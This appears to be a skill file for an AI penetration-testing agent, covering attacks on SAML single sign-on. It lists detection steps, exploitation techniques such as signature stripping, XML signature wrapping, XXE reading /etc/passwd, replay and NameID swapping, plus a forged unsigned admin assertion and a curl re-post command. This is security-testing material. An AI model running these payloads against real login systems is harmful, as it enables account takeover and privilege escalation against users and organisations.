---
name: saml-sso
description: SAML SSO attacks — XML signature wrapping, signature bypass, XML parsing flaws, token manipulation, replay, and login-by-assertion abuse. Use when the app integrates SAML IdP login (often enterprise SSO buttons, Okta/Azure AD/Keycloak).
category: authn-authz
---

# SAML SSO

## Detection
- Find SAML endpoints: `/SAML`, `/sso`, `RelayState`, `SAMLResponse` form fields, `samlResponse` in POST body.
- Determine the IdP and whether the SP validates the signature at all.

## Exploitation
1. **Signature bypass / no verification**: remove the `<Signature>` element entirely; modify `<NameID>`/attribute values (e.g. role/email) and send unsigned — many SPs accept unsigned assertions.
2. **XML Signature Wrapping (XSW)**: duplicate assertion in document and apply signature to one copy while SP reads the other (attacker-controlled).
3. **Comment/padding tricks**: `<!---->`/whitespace in signature values; `xsi:nil="true"`; ID attribute normalization differences.
4. **XXE in SAML parsing**: entity expansion in NameID/AttributeValue → read `/etc/passwd` or SSRF.
5. **Replay**: reuse a valid SAMLResponse from your own session for a different user (change `Recipient`/`Audience`), or replay across sessions if not single-use.
6. **NameID confusion**: if `email` attribute is used for account matching and not signed, swap to victim email → account takeover.

## Payloads
```xml
<!-- unsigned assertion (signature stripped) -->
<samlp:Response>
  <saml:Assertion>
    <saml:Subject><saml:NameID>victim@x.com</saml:NameID></saml:Subject>
    <saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
  </saml:Assertion>
</samlp:Response>
```

## Tool Commands (Windows)
```powershell
# intercept SAMLResponse, strip <ds:Signature>...</ds:Signature>, re-post
curl.exe -s -X POST "$U/SAML/AssertionConsumerService" -d 'SAMLResponse=<urlencoded>'
# tamper NameID then re-encode (base64 + URL-encode)
```

## Verification & Evidence
- Show account matching via tampered attribute, or unsigned-accepted assertion, or replay success.
- If you can't set up a real IdP, prove signature is not validated (tampered/unsigned accepted).